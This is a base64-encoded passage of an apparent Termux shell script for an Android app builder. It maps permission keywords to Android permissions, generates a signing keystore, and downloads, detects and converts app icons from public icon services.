HJlY29yZCkgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQ09SRF9BVURJTycgOzsKICAgICAgc3RvcmFnZXxhcmNoaXZlc3xmaWxlc3xzZGNhcmQpCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQURfRVhURVJOQUxfU1RPUkFHRScKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uV1JJVEVfRVhURVJOQUxfU1RPUkFHRScKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uTUFOQUdFX0VYVEVSTkFMX1NUT1JBR0UnIDs7CiAgICAgIGxvY2F0aW9ufGdwc3xnZW8pCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkFDQ0VTU19GSU5FX0xPQ0FUSU9OJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5BQ0NFU1NfQ09BUlNFX0xPQ0FUSU9OJyA7OwogICAgICB2aWJyYXRlfHZpYnJhdGlvbikgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlZJQlJBVEUnIDs7CiAgICAgIGJsdWV0b290aHxidCkKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQkxVRVRPT1RIJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5CTFVFVE9PVEhfQ09OTkVDVCcKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQkxVRVRPT1RIX1NDQU4nIDs7CiAgICAgIG5mYykgICAgICAgICAgICAgICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uTkZDJyA7OwogICAgICBjb250YWN0cykKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uUkVBRF9DT05UQUNUUycKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uV1JJVEVfQ09OVEFDVFMnIDs7CiAgICAgIHBob25lfGNhbGwpCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkNBTExfUEhPTkUnCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQURfUEhPTkVfU1RBVEUnIDs7CiAgICAgIHNtcykKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uU0VORF9TTVMnCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQ0VJVkVfU01TJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5SRUFEX1NNUycgOzsKICAgICAgd2FrZXx3YWtlbG9jaykgICAgICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5XQUtFX0xPQ0snIDs7CiAgICAgIG5vdGlmaWNhdGlvbnN8bm90aWYpICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uUE9TVF9OT1RJRklDQVRJT05TJyA7OwogICAgICBmbGFzaGxpZ2h0fHRvcmNoKSAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkZMQVNITElHSFQnIDs7CiAgICAgIHNlbnNvcnMpICAgICAgICAgICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQk9EWV9TRU5TT1JTJyA7OwogICAgICAqKSAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiJHAiIDs7CiAgICBlc2FjCiAgZG9uZQp9Cl9nZW5faWNvbigpIHsKICBsb2NhbCBkc3Q9IiQxIiBzej0iJHsyOi0xOTJ9IgogIHB5dGhvbjMgLWMgIgppbXBvcnQgc3RydWN0LHpsaWIKZHN0LHN6PSckZHN0JyxpbnQoJyRzeicgaWYgJyRzeicgZWxzZSAnMTkyJykKcixnLGI9MjYsMTE1LDIzMgpkZWYgY2h1bmsobixkKToKIGM9emxpYi5jcmMzMihuK2QpJjB4ZmZmZmZmZmYKIHJldHVybiBzdHJ1Y3QucGFjaygnPkknLGxlbihkKSkrbitkK3N0cnVjdC5wYWNrKCc+SScsYykKcmF3PWInJwpmb3IgXyBpbiByYW5nZShzeik6IHJhdys9YidceDAwJytieXRlcyhbcixnLGIsMjU1XSpzeikKcG5nPWInXHg4OVBOR1xyXG5ceDFhXG4nK2NodW5rKGInSUhEUicsc3RydWN0LnBhY2soJz5JSUJCQkJCJyxzeixzeiw4LDYsMCwwLDApKStjaHVuayhiJ0lEQVQnLHpsaWIuY29tcHJlc3MocmF3LDYpKStjaHVuayhiJ0lFTkQnLGInJykKb3Blbihkc3QsJ3diJykud3JpdGUocG5nKQoiIDI+L2Rldi9udWxsCn0KX3Jlc2l6ZV9pY29uKCkgewogIGxvY2FsIHNyYz0iJDEiIGRzdD0iJDIiIHN6PSIkMyIKICBta2RpciAtcCAiJChkaXJuYW1lICIkZHN0IikiCiAgcHl0aG9uMyAtYyAiCmltcG9ydCBzeXMsc2h1dGlsCnRyeToKIGZyb20gUElMIGltcG9ydCBJbWFnZQogSW1hZ2Uub3BlbignJHNyYycpLmNvbnZlcnQoJ1JHQkEnKS5yZXNpemUoKGludCgnJHN6JyksaW50KCckc3onKSksSW1hZ2UuTEFOQ1pPUykuc2F2ZSgnJGRzdCcpCmV4Y2VwdDogc2h1dGlsLmNvcHkoJyRzcmMnLCckZHN0JykKIiAyPi9kZXYvbnVsbCB8fCBjcCAiJHNyYyIgIiRkc3QiCn0KX2Vuc3VyZV9rZXlzdG9yZSgpIHsKICBbIC1mICIkVzJBX0tTIiBdICYmIHJldHVybgogIF9pbmZvICdHZXJhbmRvIGtleXN0b3JlLi4uJwogIG1rZGlyIC1wICIkKGRpcm5hbWUgIiRXMkFfS1MiKSIKICBrZXl0b29sIC1nZW5rZXlwYWlyIC12IC1rZXlzdG9yZSAiJFcyQV9LUyIgLWFsaWFzIGFwcGZvcmdlIC1rZXlhbGcgRUMgLWtleXNpemUgMjU2IC12YWxpZGl0eSAxMDAwMCAtc3RvcmVwYXNzIGFwcGZvcmdlLWtleSAta2V5cGFzcyBhcHBmb3JnZS1rZXkgLWRuYW1lICdDTj1hcHBmb3JnZSwgTz1FbGxpb3RPUywgQz1CUicgMj4vZGV2L251bGwgJiYgX29rICdLZXlzdG9yZSBjcmlhZGEnCn0KX0lDT05fVElNR19CQVNFPSIkSE9NRS8ueHBtL3RpbWctdG1wIgpfaWNvbl9ta3RlbXBfZGlyKCkgewogIGxvY2FsIElEOyBJRD0iJChkYXRlICslWSVtJWRfJUglTSVTKSQkIgogIGxvY2FsIERJUj0iJF9JQ09OX1RJTUdfQkFTRS8kSUQiCiAgbWtkaXIgLXAgIiRESVIiIDI+L2Rldi9udWxsIHx8IHJldHVybiAxCiAgcHJpbnRmICclcycgIiRESVIiCn0KX2ljb25fY2hlY2tfbmV0KCkgewogICMgY3VybCB0ZW0gcHJpb3JpZGFkZSDigJQgw6kgbyBxdWUgc2FiZW1vcyBmdW5jaW9uYXIgbm8gVGVybXV4CiAgaWYgY29tbWFuZCAtdiBjdXJsID4vZGV2L251bGwgMj4mMTsgdGhlbgogICAgY3VybCAtZnNTTCAtLW1heC10aW1lIDUgXAogICAgICAgICAtQSAnQXBwRm9yZ2UvMS4zJyBcCiAgICAgICAgICdodHRwczovL3d3dy5nb29nbGUuY29tL2dlbmVyYXRlXzIwNCcgXAogICAgICAgICAtbyAvZGV2L251bGwgMj4vZGV2L251bGwKICAgIHJldHVybiAkPwogIGZpCiAgIyBGYWxsYmFjayB1cmxsaWIg4oaSIG1lc21vIGVuZHBvaW50IGRlIGNvbmVjdGl2aWRhZGUgZG8gQW5kcm9pZAogIHB5dGhvbjMgLWMgIgppbXBvcnQgdXJsbGliLnJlcXVlc3QsIHN5cwpmb3IgdXJsIGluIFsnaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9nZW5lcmF0ZV8yMDQnLAogICAgICAgICAgICAnaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9zMi9mYXZpY29ucz9kb21haW49Z29vZ2xlLmNvbSZzej0xNicsCiAgICAgICAgICAgICdodHRwOi8vY29ubmVjdGl2aXR5Y2hlY2suZ3N0YXRpYy5jb20vZ2VuZXJhdGVfMjA0J106CiAgICB0cnk6CiAgICAgICAgcmVxPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodXJsLGhlYWRlcnM9eydVc2VyLUFnZW50JzonQXBwRm9yZ2UvMS4zJ30pCiAgICAgICAgdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEsdGltZW91dD01KQogICAgICAgIHN5cy5leGl0KDApCiAgICBleGNlcHQ6IHBhc3MKc3lzLmV4aXQoMSkKIiAyPi9kZXYvbnVsbAp9Cl9pY29uX2ZldGNoX3VybCgpIHsKICBsb2NhbCBVUkw9IiQxIiBEU1Q9IiQyIiBUSU1FT1VUPSIkezM6LTE1fSIKICBpZiBjb21tYW5kIC12IGN1cmwgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgICBjdXJsIC1mc1NMIC0tbWF4LXRpbWUgIiRUSU1FT1VUIiBcCiAgICAgICAgIC1BICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTIpIEFwcEZvcmdlLzEuMycgXAogICAgICAgICAtbyAiJERTVCIgIiRVUkwiIDI+L2Rldi9udWxsCiAgICBpZiBbIC1mICIkRFNUIiBdICYmIFsgIiQod2MgLWMgPCAiJERTVCIpIiAtZ3QgNjQgXTsgdGhlbgogICAgICByZXR1cm4gMAogICAgZmkKICAgIHJtIC1mICIkRFNUIgogIGZpCiAgcHl0aG9uMyAtYyAiCmltcG9ydCB1cmxsaWIucmVxdWVzdCwgc3lzCnVybD0nJFVSTCc7IGRzdD0nJERTVCcKaGRycz17J1VzZXItQWdlbnQnOidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTIpIEFwcEZvcmdlLzEuMycsCiAgICAgICdBY2NlcHQnOicqLyonLCdBY2NlcHQtTGFuZ3VhZ2UnOidlbi1VUyxlbjtxPTAuOSd9CnRyeToKICAgIHJlcT11cmxsaWIucmVxdWVzdC5SZXF1ZXN0KHVybCxoZWFkZXJzPWhkcnMpCiAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLHRpbWVvdXQ9JFRJTUVPVVQpIGFzIHI6CiAgICAgICAgZGF0YT1yLnJlYWQoKQogICAgaWYgbGVuKGRhdGEpPDY0OiBzeXMuZXhpdCgxKQogICAgb3Blbihkc3QsJ3diJykud3JpdGUoZGF0YSk7IHN5cy5leGl0KDApCmV4Y2VwdDogc3lzLmV4aXQoMSkKIiAyPi9kZXYvbnVsbAp9Cl9pY29uX2RldGVjdF9mb3JtYXQoKSB7CiAgcHl0aG9uMyAtYyAiCmltcG9ydCBzeXMsIG9zCmY9JyQxJwppZiBub3Qgb3MucGF0aC5pc2ZpbGUoZikgb3Igb3MucGF0aC5nZXRzaXplKGYpPDMyOgogICAgcHJpbnQoJ3Vua25vd24nKTsgc3lzLmV4aXQoMSkKaD1vcGVuKGYsJ3JiJykucmVhZCgxNikKcmF3NTEyPW9wZW4oZiwncmInKS5yZWFkKDUxMikKaWYgaFs6NF09PWInXHg4OVBORyc6IHByaW50KCdwbmcnKTsgc3lzLmV4aXQoMCkKaWYgaFs6Ml09PWInXHhmZlx4ZDgnOiBwcmludCgnanBlZycpOyBzeXMuZXhpdCgwKQppZiBoWzo0XT09YidSSUZGJyBhbmQgaFs4OjEyXT09YidXRUJQJzogcHJpbnQoJ3dlYnAnKTsgc3lzLmV4aXQoMCkKaWYgaFs6M109PWInR0lGJzogcHJpbnQoJ2dpZicpOyBzeXMuZXhpdCgwKQppZiBiJzxzdmcnIGluIHJhdzUxMiBvciBiJzxTVkcnIGluIHJhdzUxMjogcHJpbnQoJ3N2ZycpOyBzeXMuZXhpdCgwKQpwcmludCgndW5rbm93bicpOyBzeXMuZXhpdCgxKQoiIDI+L2Rldi9udWxsCn0KX2ljb25fc3ZnX3RvX3BuZygpIHsKICBsb2NhbCBTVkc9IiQxIiBQTkc9IiQyIiBTSVpFPSIkezM6LTE5Mn0iCiAgcHl0aG9uMyAtYyAiCmltcG9ydCBzeXMsIG9zLCBzdWJwcm9jZXNzCnN2Zz0nJFNWRyc7IHBuZz0nJFBORyc7IHN6PWludCgnJFNJWkUnKQpkZWYgcnVuKCpjbWQpOgogICAgdHJ5OgogICAgICAgIHI9c3VicHJvY2Vzcy5ydW4obGlzdChjbWQpLGNhcHR1cmVfb3V0cHV0PVRydWUsdGltZW91dD0xNSkKICAgICAgICByZXR1cm4gci5yZXR1cm5jb2RlPT0wIGFuZCBvcy5wYXRoLmlzZmlsZShwbmcpIGFuZCBvcy5wYXRoLmdldHNpemUocG5nKT4xMDAKICAgIGV4Y2VwdDogcmV0dXJuIEZhbHNlCnRyeToKICAgIGZyb20gY2Fpcm9zdmcgaW1wb3J0IHN2ZzJwbmcKICAgIHN2ZzJwbmcoYnl0ZXN0cmluZz1vcGVuKHN2ZywncmInKS5yZWFkKCksd3JpdGVfdG89cG5nLG91dHB1dF93aWR0aD1zeixvdXRwdXRfaGVpZ2h0PXN6KQogICAgaWYgb3MucGF0aC5pc2ZpbGUocG5nKSBhbmQgb3MucGF0aC5nZXRzaXplKHBuZyk+MTAwOiBzeXMuZXhpdCgwKQpleGNlcHQ6IHBhc3MKaWYgcnVuKCdyc3ZnLWNvbnZlcnQnLCctdycsc3RyKHN6KSwnLWgnLHN0cihzeiksJy1vJyxwbmcsc3ZnKTogc3lzLmV4aXQoMCkKaWYgcnVuKCdpbmtzY2FwZScsJy0tZXhwb3J0LWZpbGVuYW1lPScrcG5nLCctLWV4cG9ydC13aWR0aD0nK3N0cihzeiksJy0tZXhwb3J0LWhlaWdodD0nK3N0cihzeiksc3ZnKTogc3lzLmV4aXQoMCkKaWYgcnVuKCdjb252ZXJ0JywnLWJhY2tncm91bmQnLCdub25lJywnLXJlc2l6ZScsc3RyKHN6KSsneCcrc3RyKHN6KSxzdmcscG5nKTogc3lzLmV4aXQoMCkKdHJ5OgogICAgZnJvbSBzdmdsaWIuc3ZnbGliIGltcG9ydCBzdmcycmxnCiAgICBmcm9tIHJlcG9ydGxhYi5ncmFwaGljcyBpbXBvcnQgcmVuZGVyUE0KICAgIGQ9c3ZnMnJsZyhzdmcpCiAgICBpZiBkOiByZW5kZXJQTS5kcmF3VG9GaWxlKGQscG5nLGZtdD0nUE5HJyk7IHN5cy5leGl0KDApCmV4Y2VwdDogcGFzcwpzeXMuZXhpdCgyKQoiIDI+L2Rldi9udWxsCiAgcmV0dXJuICQ/Cn0KX2ljb25fdG9fcG5nKCkgewogIGxvY2FsIFNSQz0iJDEiIERTVD0iJDIiIFNJWkU9IiR7MzotMTkyfSIKICBsb2NhbCBGTVQ7IEZNVD0kKF9pY29uX2RldGVjdF9mb3JtYXQgIiRTUkMiKQogIGNhc2UgIiRGTVQiIGluCiAgICBwbmd8anBlZ3x3ZWJwfGdpZikKICAgICAgcHl0aG9uMyAtYyAiCnRyeToKICAgIGZyb20gUElMIGltcG9ydCBJbWFnZQogICAgSW1hZ2Uub3BlbignJFNSQycpLmNvbnZlcnQoJ1JHQkEnKS5yZXNpemUoKGludCgnJFNJWkUnKSxpbnQoJyRTSVpFJykpKS5zYXZlKCckRFNUJykKZXhjZXB0OgogICAgaW1wb3J0IHNodXRpbDsgc2h1dGlsLmNvcHkoJyRTUkMnLCckRFNUJykKIiAyPi9kZXYvbnVsbCB8fCBjcCAiJFNSQyIgIiREU1QiIDs7CiAgICBzdmcpCiAgICAgIGlmICEgX2ljb25fc3ZnX3RvX3BuZyAiJFNSQyIgIiREU1QiICIkU0laRSI7IHRoZW4KICAgICAgICBfd2FybiAnU1ZHIG5hbyBjb252ZXJ0aWRvIOKAlCB1c2FuZG8gcGxhY2Vob2xkZXInCiAgICAgICAgX2dlbl9pY29uICIkRFNUIiAiJFNJWkUiCiAgICAgIGZpIDs7CiAgICAqKQogICAgICBweXRob24zIC1jICIKdHJ5OgogICAgZnJvbSBQSUwgaW1wb3J0IEltYWdlOyBJbWFnZS5vcGVuKCckU1JDJykuY29udmVydCgnUkdCQScpLnNhdmUoJyREU1QnKQpleGNlcHQ6IGltcG9ydCBzaHV0aWw7IHNodXRpbC5jb3B5KCckU1JDJywnJERTVCcpCiIgMj4vZGV2L251bGwgfHwgY3AgIiRTUkMiICIkRFNUIiA7OwogIGVzYWMKICBbIC1mICIkRFNUIiBdICYmIFsgIiQod2MgLWMgPCAiJERTVCIpIiAtZ3QgNjQgXQp9Cl9pY29uX3NlYXJjaF9pY29uaWZ5KCkgewogIGxvY2FsIFRFUk09IiQxIiBUTVBESVI9IiQyIiBNQVg9IiR7MzotNX0iCiAgcHl0aG9uMyAtYyAiCmltcG9ydCBzeXMsIG9zLCBqc29uCnRyeToKICAgIGltcG9ydCB1cmxsaWIucmVxdWVzdCwgdXJsbGliLnBhcnNlCiAgICBIRFI9eydVc2VyLUFnZW50JzonTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyKSBBcHBGb3JnZS8xLjMnLAogICAgICAgICAnQWNjZXB0JzonYXBwbGljYXRpb24vanNvbicsJ0FjY2VwdC1MYW5ndWFnZSc6J2VuLVVTLGVuO3E9MC45J30KICAgIHRlcm09dXJsbGliLnBhcnNlLnF1b3RlKCckVEVSTScpCiAgICBob3N0cz1bJ2FwaS5pY29uaWZ5LmRlc2lnbicsJ2FwaTIuaWNvbmlmeS5kZXNpZ24nLCdhcGkzLmljb25pZnkuZGVzaWduJ10KICAgIGRhdGE9Tm9uZQogICAgZm9yIGhvc3QgaW4gaG9zdHM6CiAgICAgICAgdXJsPSdodHRwczovLycraG9zdCsnL3NlYXJjaD9xdWVyeT0nK3Rlcm0rJyZsaW1pdD0kTUFYJwogICAgICAgIHRyeToKICAgICAgICAgICAgcmVxPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodXJsLGhlYWRlcnM9SERSKQogICAgICAgICAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLHRpbWVvdXQ9MTApIGFzIHI6CiAgICAgICAgICAgICAgICBkYXRhPWpzb24ubG9hZChyKQogICAgICAgICAgICBpZiBkYXRhOiBicmVhawogICAgICAgIGV4Y2VwdDogY29udGludWUKICAgIGlmIG5vdCBkYXRhOiBzeXMuZXhpdCgxKQogICAgaWNvbnM9ZGF0YS5nZXQoJ2ljb25zJyxbXSlbOmludCgnJE1BWCcpXQogICAgaWYgbm90IGljb25zOiBzeXMuZXhpdCgyKQogICAgbj0wCiAgICBmb3IgaWNvbl9pZCBpbiBpY29uczoKICAgICAgICBwYXJ0cz1pY29uX2lkLnNwbGl0KCc6JykKICAgICAgICBpZiBsZW4ocGFydHMpIT0yOiBjb250aW51ZQogICAgICAgIHByZWZpeCxuYW1lPXBhcnRzCiAgICAgICAgaWYgJy8nIGluIHByZWZpeCBvciAnLycgaW4gbmFtZSBvciAnLi4nIGluIHByZWZpeCBvciAnLi4nIGluIG5hbWU6IGNvbnRpbnVlCiAgICAgICAgc3ZnX2RhdGE9Tm9uZQogICAgICAgIGZvciBob3N0IGluIGhvc3RzOgogICAgICAgICAgICBzdmdfdXJsPSdodHRwczovLycraG9zdCsnLycrcHJlZml4KycvJytuYW1lKycuc3ZnP3dpZHRoPTE5MiZoZWlnaHQ9MTkyJwogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdChzdmdfdXJsLGhlYWRlcnM9SERSKQogICAgICAgICAgICAgICAgd2l0aCB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcSx0aW1lb3V0PTgpIGFzIHI6CiAgICAgICAgICAgICAgICAgICAgc3ZnX2RhdGE9ci5yZWFkKCkKICAgICAgICAgICAgICAgIGlmIHN2Z19kYXRhIGFuZCBiJzxzdmcnIGluIHN2Z19kYXRhOiBicmVhawogICAgICAgICAgICBleGNlcHQ6IHN2Z19kYXRhPU5vbmUKICAgICAgICBpZiBub3Qgc3ZnX2RhdGEgb3IgYic8c3ZnJyBub3QgaW4gc3ZnX2RhdGE6IGNvbnRpbnVlCiAgICAgICAgbG9jYWxfcGF0aD1vcy5wYXRoLmpvaW4oJyRUTVBESVInLHN0cihuKzEpKycuc3ZnJykKICAgICAgICBvcGVuKGxvY2FsX3BhdGgsJ3diJykud3JpdGUoc3ZnX2RhdGEpCiAgICAgICAgcHJpbnQoc3RyKG4rMSkrJzppY29uaWZ5OicrbG9jYWxfcGF0aCkKICAgICAgICBuKz0xCiAgICAgICAgaWYgbj49aW50KCckTUFYJyk6IGJyZWFrCiAgICBzeXMuZXhpdCgwIGlmIG4+MCBlbHNlIDIpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgIHN5cy5leGl0KDEpCiIgMj4vZGV2L251bGwKfQpfaWNvbl9zZWFyY2hfc2ltcGxlaWNvbnMoKSB7CiAgbG9jYWwgVEVSTT0iJDEiIFRNUERJUj0iJDIiIE5VTT0iJDMiCiAgbG9jYWwgU0xVRzsgU0xVRz0kKHByaW50ZiAnJXMnICIkVEVSTSIgfCB0ciAnQS1aJyAnYS16JyB8IHNlZCAncy9bXmEtejAtOV0vL2cnKQogIFsgLXogIiRTTFVHIiBdICYmIHJldHVybiAxCiAgbG9jYWwgRFNUPSIkVE1QRElSLyR7TlVNfS5zdmciCiAgbG9jYWwgRk9VTkQ9MAogIGlmIF9pY29uX2ZldGNoX3VybCAiaHR0cHM6Ly9jZG4uc2ltcGxlaWNvbnMub3JnLyR7U0xVR30vMWE3M2U4IiAiJERTVCIgODsgdGhlbgogICAgbG9jYWwgRk1UOyBGTVQ9JChfaWNvbl9kZXRlY3RfZm9ybWF0ICIkRFNUIik7IFsgIiRGTVQiID0gInN2ZyIgXSAmJiBGT1VORD0xCiAgZmkKICBpZiBbICIkRk9VTkQiIC1lcSAwIF07IHRoZW4KICAgIHJtIC1mICIkRFNUIgogICAgaWYgX2ljb25fZmV0Y2hfdXJsICJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL3NpbXBsZS1pY29uc0BsYXRlc3QvaWNvbnMvJHtTTFVHfS5zdmciICIkRFNUIiA4OyB0aGVuCiAgICAgIGxvY2FsIEZNVDI7IEZNVDI9JChfaWNvbl9kZXRlY3RfZm9ybWF0ICIkRFNUIik7IFsgIiRGTVQyIiA9ICJzdmciIF0gJiYgRk9VTkQ9MQogICAgZmkKICBmaQogIGlmIFsgIiRGT1VORCIgLWVxIDEgXTsgdGhlbiBwcmludGYgJyVzOnNpbXBsZWljb25zOiVzXG4nICIkTlVNIiAiJERTVCI7IHJldHVybiAwOyBmaQogIHJtIC1mICIkRFNUIjsgcmV0dXJuIDEKfQpfaWNvbl9zZWFyY2hfZ29vZ2xlX2Zhdmljb24oKSB7CiAgbG9jYWwgVEVSTT0iJDEiIFRNUERJUj0iJDIiIE5VTT0iJDMiCiAgbG9jYWwgU0xVRzsgU0xVRz0kKHByaW50ZiAnJXMnICIkVEVSTSIgfCB0ciAnQS1aJyAnYS16JyB8IHNlZCAncy9bXmEtejAtOS1dLy9nJykKICBbIC16ICIkU0xVRyIgXSAmJiByZXR1cm4gMQogIGxvY2FsIERTVD0iJFRNUERJUi8ke05VTX0ucG5nIgogIGlmIF9pY29uX2ZldGNoX3VybCAiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9zMi9mYXZpY29ucz9kb21haW49JHtTTFVHfS5jb20mc3o9MTI4IiAiJERTVCIgODsgdGhlbgogICAgbG9jYWwgRk1UOyBGTVQ9JChfaWNvbl9kZXRlY3RfZm9ybWF0ICIkRFNUIikKICAgIGlmIFsgIiRGTVQiID0gInBuZyIgXSB8fCBbICIkRk1UIiA9ICJqcGVnIiBdOyB0aGVuCiAgICAgIGxvY2FsIFNaOyBTWj0kKHdjIC1jIDwgIiREU1QiKQogICAgICBpZiBbICIkU1oiIC1ndCA1MDAgXTsgdGhlbiBwcmludGYgJyVzOmdvb2dsZS1mYXZpY29uOiVzXG4nICIkTlVNIiAiJERTVCI7IHJldHVybiAwOyBmaQogICAgZmkKICBmaQogIHJtIC1mICIkRFNUIjsgcmV0dXJuIDEKfQpfaWNvbl9zZWFyY2hfZmF2aWNvbl9pbSgpIHsKICBsb2NhbCBURVJNPSIkMSIgVE1QRElSPSIkMiIgTlVNPSIkMyIKICBsb2NhbCBTTFVHOyBTTFVHPSQocHJpbnRmICclcycgIiRURVJNIiB8IHRyICdBLVonICdhLXonIHwgc2VkICdzL1teYS16MC05LV0vL2cnKQogIFsgLXogIiRTTFVHIiBdICYmIHJldHVybiAxCiAgbG9jYWwgRFNUPSIkVE1QRElSLyR7TlVNfS5wbmciCiAgaWYgX2ljb25fZmV0Y2hfdXJsICJodHRwczovL2Zhdmljb24uaW0vJHtTTFVHfS5jb20/bGFyZ2VyPXRydWUiICIkRFNUIiAxMDsgdGhlbgogICAgbG9jYWwgRk1UOyBGTVQ9JChfaWNvbl9kZXRlY3RfZm9ybWF0ICIkRFNUIikKICAgIGlmIFsgIiRGTVQiID0gInBuZyIgXSB8fCBbICIkRk1UIiA9ICJqcGVnIiBdIHx8IFsgIiRGTVQiID0gIndlYnAiIF07IHRoZW4KICAgICAgbG9jYWwgU1o7IFNaPSQod2MgLWMgPCAiJERTVCIpCiAgICAgIFsgIiRTWiIgLWd0IDUwMCBdICYmIHByaW50ZiAnJXM6ZmF2aWNvbi5pbTolc1xuJyAiJE5VTSIgIiREU1QiICYmIHJldHVybiAwCiAgICBmaQogIGZpCiAgcm0gLWYgIiREU1QiOyByZXR1cm4gMQp9Cl9pY29uX3Nob3dfdGltZygpIHsKICBsb2NhbCBGSUxFPSIkMSIKICBpZiAhIGNvbW1hbmQgLXYgdGltZyA+L2Rldi9udWxsIDI+JjE7IHRoZW4KICAgIHByaW50ZiAnICBceGUyXHg5NFx4ODIgXDAzM1swOzkwbShpbnN0YWxlIHRpbWc6IHBrZyBpbnN0YWxsIHRpbWcpXDAzM1swbVxuJwogICAgcmV0dXJuCiAgZmkKICBpZiBbICEgLWYgIiRGSUxFIiBdOyB0aGVuCiAgICBwcmludGYgJyAgXHhlMlx4OTRceDgyIFwwMzNbMDs5MG0oYXJxdWl2byBuYW8gZW5jb250cmFkbylcMDMzWzBtXG4nCiAgICByZXR1cm4KICBmaQogIGxvY2FsIFNIT1dfRklMRT0iJEZJTEUiIFRNUF9QUkVWSUVXPSIiIFNWR19PSz0wCiAgIyBTVkdzIGRvIEljb25pZnkgdGVtIGZ1bmRvIHRyYW5zcGFyZW50ZSDigJQgY29udmVydGUgcGFyYSBQTkcgY29tIGZ1bmRvIGJyYW5jbwogIGNhc2UgIiQocHJpbnRmICclcycgIiR7RklMRSMjKi59IiB8IHRyICdBLVonICdhLXonKSIgaW4KICAgIHN2ZykKICAgICAgVE1QX1BSRVZJRVc9JChta3RlbXAgL3RtcC9hZl9wcmV2X1hYWFhYWC5wbmcgMj4vZGV2L251bGwpCiAgICAgICMgQ29udmVydGUgU1ZHIHBhcmEgUE5HIHVzYW5kbyBQeXRob24gKG1haXMgY29tcGF0aXZlbCBjb20gVGVybXV4KQogICAgICBweXRob24zIC1jICIKaW1wb3J0IHN1YnByb2Nlc3MsIHN5cywgb3MKc3ZnPSckRklMRSc7IHBuZz0nJFRNUF9QUkVWSUVXJwoKZGVmIGFkZF93aGl0ZV9iZyhwYXRoKToKICAgIHRyeToKICAgICAgICBmcm9tIFBJTCBpbXBvcnQgSW1hZ2UKICAgICAgICBpbWc9SW1hZ2Uub3BlbihwYXRoKS5jb252ZXJ0KCdSR0JBJykKICAgICAgICBiZz1JbWFnZS5uZXcoJ1JHQkEnLGltZy5zaXplLCgyNTUsMjU1LDI1NSwyNTUpKQogICAgICAgIGJnLnBhc3RlKGltZyxtYXNrPWltZy5zcGxpdCgpWzNdKQogICAgICAgIGJnLmNvbnZlcnQoJ1JHQicpLnNhdmUocGF0aCkKICAgIGV4Y2VwdDogcGFzcwoKIyAxLiByc3ZnLWNvbnZlcnQgdmlhIHN0ZG91dCAoY29tcGF0aWJpbGlkYWRlIG1heGltYSDigJQgc2VtIGZsYWdzIGV4dHJhcykKdHJ5OgogICAgcj1zdWJwcm9jZXNzLnJ1bihbJ3JzdmctY29udmVydCcsJy13JywnOTYnLCctaCcsJzk2JywnLWEnLHN2Z10sCiAgICAgICAgICAgICAgICAgICAgIGNhcHR1cmVfb3V0cHV0PVRydWUsdGltZW91dD0xMCkKICAgIGlmIHIucmV0dXJuY29kZT09MCBhbmQgbGVuKHIuc3Rkb3V0KT4xMDA6CiAgICAgICAgb3BlbihwbmcsJ3diJykud3JpdGUoci5zdGRvdXQpCiAgICAgICAgYWRkX3doaXRlX2JnKHBuZykKICAgICAgICBzeXMuZXhpdCgwKQpleGNlcHQ6IHBhc3MKCiMgMi4gcnN2Zy1jb252ZXJ0IGNvbSAtbyAoYWxndW1hcyB2ZXJzb2VzIG5hbyBzdXBvcnRhbSBzdGRvdXQpCnRyeToKICAgIHI9c3VicHJvY2Vzcy5ydW4oWydyc3ZnLWNvbnZlcnQnLCctdycsJzk2JywnLWgnLCc5NicsJy1hJywnLW8nLHBuZyxzdmddLAogICAgICAgICAgICAgICAgICAgICBjYXB0dXJlX291dHB1dD1UcnVlLHRpbWVvdXQ9MTApCiAgICBpZiByLnJldHVybmNvZGU9PTAgYW5kIG9zLnBhdGguaXNmaWxlKHBuZykgYW5kIG9zLnBhdGguZ2V0c2l6ZShwbmcpPjEwMDoKICAgICAgICBhZGRfd2hpdGVfYmcocG5nKQogICAgICAgIHN5cy5leGl0KDApCmV4Y2VwdDogcGFzcwoKIyAzLi